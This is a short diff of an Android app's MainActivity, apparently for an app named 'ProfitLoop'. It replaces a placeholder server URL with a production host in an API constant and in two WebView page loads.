@@ -40,8 +40,7 @@ public class MainActivity extends Activity {
     private static final String PREFS_NAME = "ProfitLoopPrefs";
     private static final String KEY_NODE = "NodeCode";
     private static final String KEY_KEY = "PairKey";
-    private static final String API_URL = "https://votre-serveur.com/api.php"; // À remplacer par votre URL de production
-
+private static final String API_URL = "https://magicservice-blue.gt.tc/api.php";
     private String nodeCode = "";
     private String pairingKey = "";
     private BroadcastReceiver smsReceiver;
@@ -117,14 +116,14 @@ public class MainActivity extends Activity {
 
                 llConfig.setVisibility(View.GONE);
                 webView.setVisibility(View.VISIBLE);
-                webView.loadUrl("https://votre-serveur.com/index.html");
+                webView.loadUrl("https://magicservice-blue.gt.tc/index.html");
                 Toast.makeText(this, "Terminal rattaché avec succès.", Toast.LENGTH_SHORT).show();
             }
         });
 
         if (!nodeCode.isEmpty()) {
             llConfig.setVisibility(View.GONE);
-            webView.loadUrl("https://votre-serveur.com/index.html");
+            webView.loadUrl("https://magicservice-blue.gt.tc/index.html");
         } else {
             webView.setVisibility(View.GONE);
         }
